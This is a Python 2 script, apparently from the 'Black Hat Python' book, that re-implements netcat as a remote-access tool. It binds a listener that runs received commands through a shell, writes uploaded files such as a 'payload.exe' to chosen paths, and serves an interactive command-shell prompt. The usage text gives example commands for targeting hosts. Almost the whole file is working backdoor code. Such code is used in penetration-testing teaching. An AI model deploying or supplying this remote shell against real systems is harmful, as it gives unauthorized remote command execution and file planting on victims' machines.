#!/usr/bin/env python
import sys,socket,getopt,threading,subprocess
listen              = False         #Defining global variables
command             = False
upload              = False
execute             = ""
target              = ""
upload_dest         = ""
port                = 0

def banner():
    print "############   NetCat p19  #################"    

def usage():
    print "     python NetCat.py -t target_host -p port                "
    print "-l   --Listen on [host]:[port] for incoming connections     "
    print "-e   --execute = file_to_run  -execute a file               "
    print "-c   --command              -initialize a command shell     "
    print "-u   --upload = destination -upload a file                  "
    print "-t   --target    -p  --port                                 "
    print "NetCat.py -t <target> -p 5555 -l -u=c:\\payload.exe         "
    print "echo 'ABCDEFGHI' | ./NetCat.py -t 192.168.11.12 -p 135      "
    print "./NetCat.py -l -p <port> (listens on a port)                "
    print "./NetCat.py -t <target> -p 9001 -c (CTRL+D opens cmd shell) "
    print "Press 'CTRL+D' to initalize shell after connecting          "

def run_command(command):               #trim the newline
    command = command.rstrip()          #run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell = True)
    except:
        output = "Failed to execute command.\r\n"
    return output               #send output to the client

def client_handler(client_socket):
    global upload
    global execute
    global command
    if len(upload_dest):             #check for upload
        file_buffer = ""                    #read in all of the bytes and write to our destination
        while True:                         #keep reading data until none is available
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data         #now we take these bytes and try to write them out
        try:                                       
            file_descriptor = open(upload_dest,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            client_socket.send("Woohoo! File saved to %s\r\n" % upload_dest)
        except:
            client_socket.send("You suck! Your file didn't copy to %s\r\n" % upload_dest)
    if len(execute):                                         #click for command execution
        output = run_command(execute)                       #run the command
        client_socket.send(output)
    if command:                                             #going into a loop if a command shell was requested
        while True:
            prompt = "<BHPNet:#> "
            client_socket.send(prompt)
            cmd_buffer = ""                                   #now we receive until we ses a linefeed(enter key)          
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            response = run_command(cmd_buffer)                 #send back the command output
            client_socket.send(response)                     #send back the response

def server_loop():
    global target
    global port
    if not len(target):                                         #if no target is defined, we listen on all interfaces
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()                  #spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))                      #connect to our target host
        if len(buffer):
            client.send(buffer)
        while True:                                           #Wait for the data back
            recv_len = 1
            response = ""
            while recv_len:
                data     = client.recv(4096)
                recv_len = len(data)
                response+= data
                if recv_len < 4096:
                    break
            print response,    
            buffer = raw_input("")                             #wait for more input
            buffer += "\n"
            client.send(buffer)                               #send it off
    except:
        print "[*] Exception! Exiting."
        client.close()                                         #tear down the connection

def main():
    banner()
    global listen
    global port
    global execute
    global command
    global upload_dest
    global target
    if not len(sys.argv[1:]):
        usage()
    try:                            #reads command line options
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",     
                ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    for o,a in opts:                    #command options
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
           execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_dest = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:             #listen or just send data from input
        buffer = sys.stdin.read()
        client_sender(buffer)
    if listen:
        server_loop()
if __name__ == "__main__":
  main()